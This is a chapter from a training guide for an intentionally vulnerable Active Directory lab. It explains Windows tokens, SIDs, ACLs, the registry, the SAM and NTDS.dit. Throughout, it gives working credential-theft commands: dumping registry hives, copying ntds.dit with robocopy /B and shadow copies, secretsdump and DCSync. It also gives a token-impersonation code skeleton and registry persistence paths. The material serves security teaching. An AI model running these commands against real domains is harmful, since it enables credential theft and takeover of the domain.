# 02 — Windows Internals: The OS Under AD

Active Directory is a service that runs on Windows Server. To attack it you must know how the Windows host underneath behaves: how identity is represented, where credentials live in memory and on disk, how processes obtain rights, how the boot path bootstraps the LSA, and which OS primitives every offensive tool ultimately calls.

This chapter is dense by necessity. Almost every flag in PLAN.md depends on at least one mechanism described here. If you've never used Windows administratively, expect to re-read sections; the payoff is that chapters 04–14 stop feeling like incantations.

> Lab safety reminder: DVAD is intentionally vulnerable. Run only on a network you own. Treat the VMs as hostile. The lab password and configs are public; do not reuse them anywhere else.

---

## 2.0 What "Windows" means in this context

"Windows" in DVAD is the **Windows NT** family: a microkernel-ish executive plus a large userland subsystem stack. Lineage:

```
1993  NT 3.1            (first NT release)
1996  NT 4.0            (introduced NTLMv1; NetBIOS-heavy)
2000  Windows 2000       (introduced Active Directory, Kerberos v5)
2001  XP / Server 2003   (NTLMv2 default; mature AD)
2008  Server 2008        (Read-only DCs, fine-grained password policy)
2012  Server 2012(R2)    (Dynamic Access Control, gMSAs)
2016  Server 2016        (PAW, Credential Guard, JEA)
2019  Server 2019        (TLS 1.3 partial, Defender on by default)
2022  Server 2022        (DVAD default; SMB AES-256, DNS-over-HTTPS client)
2025  Server 2025        (post-quantum experimental; tighter LSA defaults)
```

All DVAD servers run Server 2022 unless explicitly noted; the workstation (`ws01`) runs Windows 10/11 Pro. Everything below is true on both.

### The 4-layer mental model

```
+-------------------------------------------------+
| User applications (Office, Edge, your payload)  |    Ring 3
+-------------------------------------------------+
| Subsystem DLLs (kernel32, advapi32, ntdll)      |    Ring 3 (userland edge)
+-------------------------------------------------+
| NT Executive + drivers (ntoskrnl.exe, hal.dll)  |    Ring 0
+-------------------------------------------------+
| Hardware (CPU, RAM, NIC, disk)                  |
+-------------------------------------------------+
```

Almost every attacker primitive lives in userland: LSASS in-memory secrets, the SAM hive on disk, the registry, processes, tokens. The kernel rarely matters until you're escalating from admin to a TCB context (driver loading, EDR bypass). DVAD does not require kernel exploits.

### What the names mean

- **ntoskrnl.exe** — NT OS Kernel. The executive: scheduler, memory manager, object manager, security reference monitor.
- **hal.dll** — Hardware Abstraction Layer. Hides hardware quirks from the kernel.
- **ntdll.dll** — Userland → kernel bridge. Every Win32 call eventually `syscall`s through ntdll.
- **kernel32.dll** — Higher-level Win32 API (CreateProcess, ReadFile). Wraps ntdll.
- **advapi32.dll** — Advanced API: registry, services, ACLs, crypto.
- **lsasrv.dll** — The LSA Server, hosted inside lsass.exe.

If you read malware source or tool source, these names will recur.

---

## 2.1 Processes, threads, sessions, jobs

A **process** is a running instance of a program with its own virtual address space, handle table, and security context (token). A **thread** is a unit of execution inside a process; it has its own stack but shares the address space. A **session** is a logon session — every interactive, network, batch, or service login creates one and groups its processes. A **job** is a kernel object that groups processes for resource management (rarely seen offensively).

Each process has two properties that matter most for attackers:

1. **Primary token** — the security context. Encodes user SID, group SIDs, privileges, integrity level. Every NT object access checks against this token.
2. **Integrity level** — Untrusted / Low / Medium / High / System. A higher-IL process can read a lower-IL process's memory; lower cannot read up. This is the basis of UAC and many sandbox boundaries.

### Process tree (illustrative)

```
System (PID 4)                                Integrity: System
  smss.exe                                     System
    csrss.exe (session 0)                      System
    wininit.exe                                System
      services.exe                             System
        svchost.exe (group: netsvcs)           System
        svchost.exe (group: localsystem)       System
        lsass.exe                              System (PPL if enabled)
        spoolsv.exe                            System
      lsm.exe                                  System
      ...
    csrss.exe (session 1)                      System
    winlogon.exe (session 1)                   System
      LogonUI.exe                              System
      userinit.exe -> spawns ->                User (Medium)
        explorer.exe (peter.parker's desktop)         Medium
          powershell.exe                       Medium  (or High after UAC consent)
          cmd.exe                              Medium
```

Three useful observations:

- **`lsass.exe` is a child of `wininit.exe`**, not `services.exe`. Killing it bluescreens the host (well, on modern Windows it reboots, with `CritProc` enforcement).
- **Session 0 vs 1+:** Services run in session 0 (no desktop). Interactive users run in session 1+. "Session 0 isolation" prevents a service from drawing a window on the user's desktop (this is why old-style "interactive services" stopped working in Vista).
- **Token inheritance:** when `explorer.exe` spawns `cmd.exe`, the cmd token is a copy of explorer's. When you "Run as administrator," winlogon/consent.exe asks LSA to mint an elevated token (the *linked token* — see §2.13).

### Inspecting processes

```
PS C:\> Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
PS C:\> Get-CimInstance Win32_Process -Filter "Name='lsass.exe'" | Format-List ProcessId,ParentProcessId,CommandLine,Owner
PS C:\> tasklist /v /fi "imagename eq powershell.exe"
PS C:\> Get-Process lsass -IncludeUserName     # needs admin
```

For tree visualisation: Sysinternals `procexp.exe` (interactive) and `pslist /t` (CLI). DVAD doesn't ship Sysinternals on lab hosts; install them on your Kali side if you want to RDP and inspect.

---

## 2.2 SIDs — the only identifier that matters

Forget usernames. Internally, every Windows principal (user, group, computer, well-known SID, service) is identified by a **Security Identifier (SID)**:

```
S-1-5-21-1004336348-1177238915-682003330-1109
^   ^   ^                                ^
|   |   |                                +- RID (Relative ID) — unique per domain/local
|   |   +- Sub-authorities — domain/local-machine identifier
|   +- Identifier authority (5 = NT_AUTHORITY)
+- Revision: always "S-1"
```

The 3 sub-authorities `21-x-y-z` identify the *issuing authority* (a domain or a local machine). The final number is the **RID**. A SID with the same prefix and a different RID is "another principal from the same domain." A SID with a different prefix is from a different domain entirely.

### Well-known SIDs (memorize the bold ones)

| SID | Principal |
|---|---|
| `S-1-0-0` | Null |
| `S-1-1-0` | **Everyone** |
| `S-1-2-0` | Local |
| `S-1-3-0` | CreatorOwner |
| `S-1-5-2` | Network (logon type 3) |
| `S-1-5-4` | Interactive (logon type 2) |
| `S-1-5-6` | Service |
| `S-1-5-7` | **Anonymous Logon** |
| `S-1-5-9` | Enterprise Domain Controllers |
| `S-1-5-11` | **Authenticated Users** |
| `S-1-5-17` | IUSR |
| `S-1-5-18` | **LocalSystem (SYSTEM)** |
| `S-1-5-19` | LocalService |
| `S-1-5-20` | NetworkService |
| `S-1-5-32-544` | **BUILTIN\Administrators** |
| `S-1-5-32-545` | BUILTIN\Users |
| `S-1-5-32-546` | BUILTIN\Guests |
| `S-1-5-32-551` | **BUILTIN\Backup Operators** (PE-027) |
| `S-1-5-32-548` | **BUILTIN\Account Operators** (PE-016) |
| `S-1-5-32-549` | **BUILTIN\Server Operators** (PE-029) |
| `S-1-5-32-550` | BUILTIN\Print Operators (PE-031) |
| `S-1-5-32-552` | BUILTIN\Replicators |
| `S-1-5-32-554` | BUILTIN\Pre-Windows 2000 Compatible Access |
| `S-1-5-32-555` | BUILTIN\Remote Desktop Users |
| `S-1-5-32-560` | BUILTIN\Windows Authorization Access |
| `S-1-5-32-562` | BUILTIN\Distributed COM Users |
| `S-1-5-32-578` | BUILTIN\Hyper-V Administrators |
| `S-1-5-32-580` | BUILTIN\Remote Management Users (WinRM) |

### Domain-specific well-known RIDs

The final RID is what differentiates "Administrator" from "peter.parker." A few are reserved:

| RID | Principal |
|---|---|
| 500 | **Administrator** (default local/domain admin) |
| 501 | Guest |
| 502 | **krbtgt** (KDC service account) |
| 512 | **Domain Admins** |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 517 | Cert Publishers |
| 518 | Schema Admins |
| 519 | **Enterprise Admins** (forest-root only) |
| 520 | Group Policy Creator Owners |
| 521 | Read-only Domain Controllers |
| 522 | Cloneable Domain Controllers |
| 525 | Protected Users (introduced 2012R2) |
| 526 | Key Admins |
| 527 | Enterprise Key Admins |
| 553 | RAS and IAS Servers |
| 571 | Allowed RODC Password Replication Group |
| 572 | Denied RODC Password Replication Group |
| 1000+ | Regular users/groups/computers |

### Why this matters operationally

- **Cross-forest privilege escalation (DF chain):** if you can forge a TGT in a *child* domain with `ExtraSids = S-1-5-21-ROOT-519`, you become Enterprise Admin in the forest root. The whole DF-001..040 family in PLAN.md rests on this.
- **Pre-Windows 2000 Compatible Access (S-1-5-32-554):** historically included `Anonymous Logon`. If it still does in DVAD (it can, depending on the lab variant), null sessions can enumerate users and groups.
- **RID 500 is special-cased:** UAC's "remote restrictions" do *not* apply to RID 500, even on workstations. This is why local admin lateral via PsExec works for `Administrator` but often fails for `localadmin1` on a workstation unless `LocalAccountTokenFilterPolicy=1`.

### Tools

```
PS> $sid = (New-Object System.Security.Principal.NTAccount('CORP','peter.parker')).Translate([System.Security.Principal.SecurityIdentifier])
PS> $sid.Value
S-1-5-21-1234567890-1234567890-1234567890-1109

# Reverse: SID -> name
PS> ([System.Security.Principal.SecurityIdentifier]'S-1-5-21-1234567890-1234567890-1234567890-500').Translate([System.Security.Principal.NTAccount])
```

From Linux:

```bash
impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10
# enumerates RIDs 500-1500 via MS-LSAT LsarLookupSids
```

[Used by REC-007 — RID cycling]

---

## 2.3 Tokens — what a process "is"

When a principal authenticates, the **LSA (Local Security Authority)** in `lsass.exe` constructs an **access token** representing that authentication. The kernel attaches it to every process the user spawns. Token contents:

- **User SID.**
- **Group SIDs** (Domain Users, Authenticated Users, Domain Admins if applicable, BUILTIN groups, plus session-specific SIDs like *Interactive* / *Network*).
- **Privileges** (Se*Privilege list).
- **Integrity level** (Mandatory Label SID — `S-1-16-4096` Low, `S-1-16-8192` Medium, `S-1-16-12288` High, `S-1-16-16384` System).
- **Logon session ID** (links to LSA's per-session secrets).
- **Default DACL** (applied to objects created without explicit security).
- **Token type** (Primary vs Impersonation) and **impersonation level** (Anonymous, Identification, Impersonation, Delegation).

### Primary vs impersonation tokens

- **Primary** — attached to a process at creation. Defines that process's identity for everything it does.
- **Impersonation** — a thread can temporarily assume another identity. Used by services that handle remote callers (RPC server impersonates the caller to enforce ACLs on shared resources).

`SeImpersonatePrivilege` lets a thread call `ImpersonateNamedPipeClient` / `ImpersonateLoggedOnUser` and become whichever identity connected to it. Combined with a coercion that makes SYSTEM connect inbound (PrintSpoofer, GodPotato), this becomes SYSTEM escalation. See §11.4.

### Privileges — full catalog of offensively relevant ones

| Privilege | What it lets you do |
|---|---|
| `SeAssignPrimaryTokenPrivilege` | Set primary token of a child — token swapping |
| `SeAuditPrivilege` | Generate security audit entries |
| `SeBackupPrivilege` | Read any file ignoring ACLs (NTDS.dit, SAM hive) |
| `SeChangeNotifyPrivilege` | Bypass traverse checking (everyone has this) |
| `SeCreateGlobalPrivilege` | Create global named objects |
| `SeCreatePagefilePrivilege` | Create page files |
| `SeCreateSymbolicLinkPrivilege` | Create NTFS symlinks (admin-only by default) |
| `SeCreateTokenPrivilege` | Create a primary token from scratch — almost never granted |
| `SeDebugPrivilege` | Open any process / read any memory → LSASS dump |
| `SeImpersonatePrivilege` | Impersonate a token — Potato chain |
| `SeIncreaseQuotaPrivilege` | Adjust process quotas |
| `SeLoadDriverPrivilege` | Load kernel drivers — BYOVD attacks |
| `SeManageVolumePrivilege` | Perform volume maintenance — read raw disk |
| `SeRelabelPrivilege` | Change object integrity labels |
| `SeRestorePrivilege` | Write any file ignoring ACLs |
| `SeSecurityPrivilege` | Manage audit + security log |
| `SeShutdownPrivilege` | Reboot |
| `SeSyncAgentPrivilege` | LDAP sync agent — directory replication |
| `SeSystemEnvironmentPrivilege` | Read/write firmware variables (EFI) |
| `SeTakeOwnershipPrivilege` | Take ownership → then WriteDacl → full |
| `SeTcbPrivilege` | "Act as part of the OS" — full SYSTEM equivalence |
| `SeTrustedCredManAccessPrivilege` | Access Credential Manager as a trusted caller |

In DVAD specifically, watch for:

- **SQL service account on sql01** running with `SeImpersonatePrivilege` (default for service accounts) → PrintSpoofer/GodPotato → SYSTEM on sql01 (PE-001/PE-002 family).
- **Backup Operators member** has `SeBackupPrivilege` enabled on DCs → can `robocopy /B` NTDS.dit out (PE-027 / CRED-013).
- **Server Operators member** has `SeBackupPrivilege`, `SeRestorePrivilege`, `SeShutdownPrivilege`, `SeSystemtimePrivilege`, and crucially the ability to *configure services* on the DC (PE-029).

### Inspecting and enabling privileges

Privileges in a token can be **Disabled** by default; the process must call `AdjustTokenPrivileges` to enable them before they take effect. So `whoami /priv` showing `SeBackupPrivilege Disabled` still means you have it — enable it programmatically (or `Set-TokenPrivilege` from a PowerShell module) and it works.

```
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeBackupPrivilege             Back up files and directories        Disabled
SeRestorePrivilege            Restore files and directories        Disabled

PS C:\> # If SeBackupPrivilege is in the token, robocopy /B can read NTDS.dit
PS C:\> robocopy /B C:\Windows\NTDS C:\Users\Public\ntds-grab ntds.dit
```

`/B` makes robocopy use the backup semantics that consult `SeBackupPrivilege`. If your token has it and it's enabled by robocopy, the read succeeds even though the file is locked by `lsass.exe`.

### Token impersonation primitives

```
HANDLE hPipe = CreateNamedPipe(...);            // Listen on \\.\pipe\evil
ConnectNamedPipe(hPipe, NULL);                   // Wait for SYSTEM to connect
ImpersonateNamedPipeClient(hPipe);               // Thread now SYSTEM
HANDLE hTok; OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hTok);
DuplicateTokenEx(hTok, ..., &hPrimary);
CreateProcessWithTokenW(hPrimary, ..., L"cmd.exe", ...);
```

That five-line sequence (in spirit) is the body of PrintSpoofer, RoguePotato, GodPotato.

---

## 2.4 Access control — DACLs, SACLs, ACEs, SDDL

Every securable Windows object (file, registry key, named pipe, process, thread, AD object, service, share) has a **security descriptor (SD)**:

```
+-------------------------------------------------+
| Security Descriptor                              |
|   Owner SID                                      |
|   Group SID (rarely used)                        |
|   DACL (Discretionary ACL)                       |
|     ACE 0  Allow Domain Users Read              |
|     ACE 1  Allow corp\peter.parker GenericAll          |
|     ACE 2  Deny corp\guest Read                 |
|   SACL (System ACL)                              |
|     ACE 0  Audit Success+Failure Write Everyone |
|   Control flags (DACL_PRESENT, SACL_AUTO, ...)   |
+-------------------------------------------------+
```

### ACE anatomy

```
Type            (Allow | Deny | Audit | ObjectAllow | ObjectDeny)
Flags           Inheritance, ObjectType, InheritedObjectType
AccessMask      32-bit bitmask: which rights
Trustee SID     Who
[ObjectType]    For object-type ACEs (AD): which child class or property
[InheritedObjectType] Which class inherits
```

The **access mask** is a 32-bit field. The low 16 bits are object-specific rights (RP, WP, CC, DC, LC, etc. on AD objects; FILE_READ_DATA, FILE_WRITE_DATA, etc. on files). The high 16 bits are standard rights (DELETE, READ_CONTROL, WRITE_DAC, WRITE_OWNER, SYNCHRONIZE) plus generic rights (GENERIC_ALL, GENERIC_READ, GENERIC_WRITE, GENERIC_EXECUTE).

### AD-specific access rights you must recognise

| Right | Mnemonic | What it grants on an AD object |
|---|---|---|
| `RIGHT_DS_CREATE_CHILD` | `CC` | Create child objects |
| `RIGHT_DS_DELETE_CHILD` | `DC` | Delete child objects |
| `RIGHT_DS_LIST` | `LC` | List children |
| `RIGHT_DS_SELF` | `SW` | "Validated write" (e.g., add self to group) |
| `RIGHT_DS_READ_PROPERTY` | `RP` | Read attributes |
| `RIGHT_DS_WRITE_PROPERTY` | `WP` | Write attributes |
| `RIGHT_DS_DELETE_TREE` | `DT` | Delete subtree |
| `RIGHT_DS_LIST_OBJECT` | `LO` | List object (rarely relevant) |
| `RIGHT_DS_CONTROL_ACCESS` | `CR` | Extended right (DCSync, ForceChangePassword, ...) |
| `WRITE_DAC` | `WD` | Modify DACL |
| `WRITE_OWNER` | `WO` | Take ownership |
| `GENERIC_ALL` | `GA` | All of the above |
| `GENERIC_WRITE` | `GW` | Write all attrs + add child |

When BloodHound says you have `GenericWrite` on a user object, this is what it means.

### Extended rights (control access) — the dangerous ones

Some operations are gated by **extended-right GUIDs**:

| GUID | Right name | What it lets you do |
|---|---|---|
| `00299570-246d-11d0-a768-00aa006e0529` | `User-Force-Change-Password` | Reset password without knowing the old |
| `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes` | One half of DCSync |
| `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | `DS-Replication-Get-Changes-All` | Other half of DCSync (the dangerous one) |
| `89e95b76-444d-4c62-991a-0facbeda640c` | `DS-Replication-Get-Changes-In-Filtered-Set` | RODC scope |
| `0e10c968-78fb-11d2-90d4-00c04f79dc55` | `Certificate-Enrollment` | Enroll for certs (ADCS) |
| `a05b8cc2-17bc-4802-a710-e7c15ab866a2` | `Certificate-AutoEnrollment` | Auto-enroll |
| `45ec5156-db7e-47bb-b53f-dbeb2d03c40f` | `Reanimate-Tombstones` | Restore deleted objects |
| `5805bc62-bdc9-4428-a5e2-856a0f4c185e` | `Allow-Read-LAPS-Password` | Read LAPS attribute (ms-MCS-AdmPwd or newer) |

Memorize `1131f6aa` (Get-Changes) and `1131f6ad` (Get-Changes-All). Spotting these GUIDs in event 4662 is the canonical DCSync detection.

### SDDL — string form of SDs

ACLs serialize to SDDL strings:

```
O:DA G:DA D:(A;;FA;;;DA)(A;;FA;;;SY)(A;OICI;0x1200a9;;;BU) S:(AU;FA;FA;;;WD)
| Owner | Group | DACL ACEs                                  | SACL  |

Letters:
  O:DA      Owner is Domain Admins
  G:DA      Group is Domain Admins
  D:        DACL begins
    (A;;FA;;;DA)        Allow FileAll to Domain Admins
    (A;;FA;;;SY)        Allow FileAll to LocalSystem
    (A;OICI;0x1200a9;;;BU)  Allow Read+Execute to BUILTIN\Users, inheritable
  S:        SACL begins
    (AU;FA;FA;;;WD)     Audit FailedAccess of File-All by World
```

You don't need to *write* SDDL — but recognise it from `Get-Acl | Format-List`, `dsacls`, BloodHound exports, and Sysmon configs.

### How an access check happens

Given a token T and an object's DACL D, requesting access mask R:

1. If the requested access includes any access type that is **owner-implicit** (READ_CONTROL, WRITE_DAC, WRITE_OWNER), grant those if T is the owner.
2. Iterate ACEs in order:
   - If ACE is a `DENY` and its trustee SID is in T, and access mask of ACE intersects R, **deny** and stop.
   - If ACE is an `ALLOW` and its trustee SID is in T, accumulate the mask into `granted`.
3. After iteration, if `granted ⊇ R`, allow. Else deny.

**Deny ACEs are evaluated as encountered, not all-first** — but the OS uses *canonical order*: explicit denies, explicit allows, inherited denies, inherited allows. The OS rejects DACLs that aren't canonical when you set them through standard APIs, but raw LDAP modifications can produce non-canonical DACLs (a real-world detection signal for ACL backdoors).

---

## 2.5 The Windows boot path

1. **UEFI firmware** loads `bootmgfw.efi` from EFI System Partition.
2. `bootmgr` reads BCD, loads `winload.efi`.
3. `winload.efi` loads `ntoskrnl.exe`, `hal.dll`, boot drivers (`HKLM\SYSTEM\Select\Current` controls the control set).
4. Kernel initializes: Memory Manager, Object Manager, Security Reference Monitor, IO Manager.
5. Kernel starts the **Session Manager Subsystem (smss.exe)**, PID typically 4xx.
6. smss launches **csrss.exe** (Windows subsystem) and **winlogon.exe** for session 0.
7. winlogon starts **services.exe** (Service Control Manager).
8. services.exe launches early services: `lsass.exe`, `wininit.exe`, etc.
9. LSA initializes: reads SAM, loads authentication packages (MSV1_0, Kerberos, Negotiate, NegoExtender, CredSSP), reads LSA secrets from `HKLM\SECURITY`.
10. winlogon launches **LogonUI.exe**, waits for credential input or remote auth.
11. User authenticates → LSA constructs the token → winlogon spawns `userinit.exe` in the user session → `userinit` spawns `explorer.exe`.

Critical implications:

- **LSASS is the heart of authentication.** It holds NT hashes (msv1_0 cache), Kerberos tickets (kerberos package), DPAPI master keys (per session), sometimes plaintexts (WDigest legacy, RDP credential delegation, CredSSP).
- **The protected process subsystem.** csrss.exe is a *Protected Process*. lsass.exe is *Protected Process Light* (PPL) when `RunAsPPL=1` is set. PPL processes can only load signed images and can't be opened for read/write by non-protected processes. Mimikatz responds with `mimidrv.sys` — a signed kernel driver — that flips off the protection bit. Defender catches this driver load instantly.
- **Anti-malware Early Launch (ELAM).** Boot-start drivers signed by AM vendors get loaded before regular boot drivers and can veto loading of unknown drivers. This is what blocks naïve BYOVD attacks on modern Windows.

### "Critical processes" — kill them, host reboots

A few processes are flagged `CritProc` in the kernel; their termination triggers BugCheck `CRITICAL_PROCESS_DIED` (0xEF). Notable: `csrss.exe`, `wininit.exe`, `services.exe`, `lsass.exe`. Mimikatz `misc::skeleton` survives reboots because it injects into lsass before any such crash; killing lsass to bypass detection is not a tactic — it reboots the host.

---

## 2.6 The registry

The registry is a hierarchical key/value database stored as **hives** (on-disk files) merged at runtime.

### Root keys

```
HKEY_LOCAL_MACHINE   (HKLM)
    SAM\             local accounts hash database (locked to SYSTEM)
    SECURITY\        LSA secrets, cached creds (locked to SYSTEM)
    SYSTEM\          services, drivers, hardware, current control set
    SOFTWARE\        installed software config
    HARDWARE\        volatile, current hardware
    BCD00000000\     boot config data

HKEY_USERS           (HKU)
    .DEFAULT\        new-user template
    S-1-5-21-...-1109\   peter.parker's hive, mounted while peter.parker logged in
    S-1-5-21-...-1109_Classes\
    S-1-5-18\        SYSTEM's HKU hive

HKEY_CURRENT_USER    (HKCU)  — alias for current user's HKU hive
HKEY_CLASSES_ROOT    (HKCR) — merge of HKLM\Software\Classes + HKCU\...Classes
HKEY_CURRENT_CONFIG  (HKCC) — alias for current hardware profile
HKEY_PERFORMANCE_DATA — live perf counters (no on-disk)
```

### Hive files (on disk)

```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SOFTWARE
C:\Windows\System32\config\DEFAULT
C:\Users\<u>\NTUSER.DAT                 ← HKCU when logged in
C:\Users\<u>\AppData\Local\Microsoft\Windows\UsrClass.dat
```

These files are **always locked** while Windows runs — held open by the kernel. To extract:

1. **`reg save`** (uses SeBackupPrivilege if you're admin, or Backup Operator):
   ```
   PS> reg save HKLM\SAM C:\Users\Public\sam.save
   PS> reg save HKLM\SYSTEM C:\Users\Public\system.save
   PS> reg save HKLM\SECURITY C:\Users\Public\security.save
   ```
2. **Volume Shadow Copy (VSS):** create a shadow, mount/copy the locked files:
   ```
   PS> vssadmin create shadow /for=C:
   PS> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
   ```
3. **`SeBackupPrivilege` + raw NTFS read** (robocopy /B, or libraries like `pwdump`/`impacket` with `\\.\C:` raw read).

### Registry values for offence (DVAD-relevant)

| Path | Why |
|---|---|
| `HKLM\SAM\SAM\Domains\Account\Users` | Local user NT hashes, F-encrypted, decryptable with SYSTEM hive's Lsa\{JD,Skew1,GBG,Data} bootkey |
| `HKLM\SECURITY\Cache` | Cached domain credentials — DCC2 hashes (mscash2) |
| `HKLM\SECURITY\Policy\Secrets` | LSA secrets — service account passwords (PLAINTEXT after decrypt) |
| `HKLM\SYSTEM\CurrentControlSet\Services\<n>` | Service config; write `ImagePath` to escalate |
| `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` | `RestrictAnonymous`, `LmCompatibilityLevel`, `RunAsPPL`, `Notification Packages` |
| `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0` | `NtlmMinClientSec`, `NtlmMinServerSec`, `RestrictReceivingNTLMTraffic` |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | Auto-start (per-machine) on logon — persistence |
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Per-user autorun — persistence (PER-008) |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` | Set additional cmdline appended to userinit |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<exe>` | Debugger hijack: set `Debugger`=cmd.exe → sticky-keys-style persistence |
| `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters` | `FullSecureChannelProtection` — ZeroLogon flag |
| `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles` | Wireless and wired network profile cache |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` | `AlwaysInstallElevated` (PE-???) |
| `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` | `EnableLUA`, `ConsentPromptBehaviorAdmin`, `LocalAccountTokenFilterPolicy` |

DVAD purposely sets `FullSecureChannelProtection=0` on DCs (ZeroLogon path) and `LocalAccountTokenFilterPolicy=1` on member servers (lateral SMB easier).

### Reading the registry from PowerShell

```
PS> Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters' |
        Select-Object FullSecureChannelProtection

PS> Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' |
        Where-Object { (Get-ItemProperty $_.PSPath).Start -eq 2 } |
        Select-Object PSChildName

PS> # Search across registry
PS> reg query HKLM\SYSTEM /s /f "password" /t REG_SZ
```

---

## 2.7 The SAM — local credential store

The **Security Accounts Manager** database stores local accounts and their NT hashes. On a domain controller it is largely ignored for domain logon; on member servers and workstations it is the local auth store.

### NT hash construction

```
password (string)                 "P@ssw0rd!"
 |
 v utf-16-le encode
"P\0@\0s\0s\0w\00\0r\0d\0!\0"
 |
 v MD4
24a4be8df9ed5d2f7e8efd6f70a3a437   (16 bytes)
```

`MD4` is broken (collisions cheap, preimage hard); the hash is *equivalent to the password* for SMB/NTLM authentication purposes — you can pass the hash without ever cracking it. The "speed of cracking" depends on `hashcat -m 1000` GPU throughput (billions/sec).

### SAM internal layout (high level)

- `HKLM\SAM\SAM\Domains\Account\F` — domain F-key (encrypted with bootkey).
- `HKLM\SAM\SAM\Domains\Account\Users\<RID-hex>\V` — per-user record (encrypted NT hash + LM hash inside).
- `HKLM\SAM\SAM\Domains\Account\Users\Names\<username>` — RID lookup.

Decryption requires:

- **Bootkey** (a.k.a. SYSKEY) — assembled from `HKLM\SYSTEM\CCS\Control\Lsa\{JD,Skew1,GBG,Data}` class names. Order shuffled, RC4 then DES used historically; modern SAMs use AES-128.
- **F-key** — RID 500's encrypted record contains the per-user encryption key.

You don't manually decode this. Tools do it.

```bash
impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
```

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:...
WDAGUtilityAccount:504:...
```

The leftmost hash is LM (`aad3b435...` is *empty LM*, meaning LM hashes are disabled — modern default). The second is NT — that's the one you crack or pass.

### Why the local Administrator hash matters in DVAD

Local admin passwords are often **shared across hosts** in an organisation. If `Administrator:NTHASH` on `ws01` matches `file01`, you can `psexec` to file01 with `--local-auth` using just that hash. DVAD intentionally re-uses the local admin password across some hosts to teach this lesson. See LAT-002 in PLAN.md.

### LAPS — the mitigation

Microsoft LAPS (now "Windows LAPS" since 2023) randomises local admin passwords per machine and stores them in AD. Two attributes:

- Legacy: `ms-MCS-AdmPwd` (cleartext, ACL-controlled) and `ms-MCS-AdmPwdExpirationTime`.
- Modern: `msLAPS-Password` (JSON blob, optionally encrypted).

If you can read `ms-MCS-AdmPwd` on a computer object → you have its local admin password. DVAD seeds a misconfigured LAPS ACL on at least one OU; that's CRED-019.

```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --laps
```

---

## 2.8 NTDS.dit — the domain database

On every DC, `C:\Windows\NTDS\ntds.dit` is the **AD database**: every user, group, computer, OU, GPO link, schema definition, and password hash.

### ESE engine

NTDS.dit is an **ESE (Extensible Storage Engine)** database — same engine used by Exchange mailbox stores and Edge profile DB. Properties:

- B-tree-based.
- ACID with logs (`edb*.log`, `edbres*.jrs` resident in `C:\Windows\NTDS\`).
- Page size 8KB on Server 2003+.
- Files locked while the `NTDS` service runs.

### Logical schema (subset)

Every directory object is a row in `datatable`, attributed by columns. A user has columns including:

- `samAccountName` (downlevel name)
- `userPrincipalName` (UPN: `peter.parker@corp.local`)
- `cn` (CN: `peter.parker Smith`)
- `objectSid`
- `objectGUID`
- `unicodePwd` — encrypted NT hash
- `dBCSPwd` — encrypted LM hash (often blank in modern)
- `ntPwdHistory`, `lmPwdHistory` — encrypted hash history
- `supplementalCredentials` — Kerberos keys (AES128/AES256/RC4/DES variants), encrypted
- `pwdLastSet`, `lastLogonTimestamp`
- `userAccountControl` (UAC flags)
- `memberOf` — back-link to groups
- `pwdProperties`, `accountExpires`
- `msDS-KeyCredentialLink` — WHFB / Shadow Cred storage
- `msDS-AllowedToActOnBehalfOfOtherIdentity` — RBCD list
- `msDS-AllowedToDelegateTo` — constrained delegation list
- `servicePrincipalName` — Kerberos SPNs (Kerberoast surface)
- `altSecurityIdentities` — explicit cert→user mapping (ESC14)

Hashes are encrypted in three layers:

1. **PEK (Password Encryption Key)** — a per-database AES key, itself encrypted with the bootkey from SYSTEM hive.
2. **Per-attribute RC4 (or AES) layer** using the PEK plus the user's RID as salt.
3. Re-encryption in transit during DRSR replication using session keys.

You do not unroll this by hand. `secretsdump -ntds ntds.dit -system SYSTEM LOCAL` does it.

### Methods to dump NTDS.dit

1. **DCSync** — MS-DRSR `DRSGetNCChanges` RPC. Requires `Replicating Directory Changes`/`...-All` extended rights. Targets the DC over RPC over SMB or TCP/135.
   ```bash
   impacket-secretsdump -just-dc corp.local/doctor.strange:'…'@10.10.0.10
   ```
2. **VSS + copy.** Snapshot C:, copy `ntds.dit` + `SYSTEM` hive, parse offline.
3. **`ntdsutil ifm`** — Microsoft-blessed IFM backup:
   ```
   PS> ntdsutil "ac in ntds" "ifm" "create full C:\Users\Public\ifm" q q
   ```
   Produces an Active Directory subfolder with `ntds.dit` and the registry subset needed.
4. **Backup Operators direct read** — `robocopy /B C:\Windows\NTDS C:\Users\Public ntds.dit`.

